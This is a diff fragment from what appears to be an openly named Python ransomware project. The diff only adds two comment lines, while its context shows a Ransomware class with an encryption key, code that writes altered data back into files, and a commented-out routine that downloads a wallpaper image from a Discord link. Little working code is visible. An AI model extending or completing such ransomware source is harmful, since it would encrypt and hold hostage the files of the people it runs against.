@@ -12,7 +12,7 @@ def start():
     print(file.i_help_corware())
 
 class Ransomware:
-
+#Encrption Method
     def __init__(self, key=None):
         """
         Initializes an instance of the Ransomware class.
@@ -105,7 +105,7 @@ class Ransomware:
 
             f.seek(0)
             f.write(data)
-
+#Changes Bacground
 """def change_background(self):
 	# go to URL and download + save image using absolute path
 	imageUrl = 'https://cdn.discordapp.com/attachments/689056108018401300/689363361980350524/iu.png'
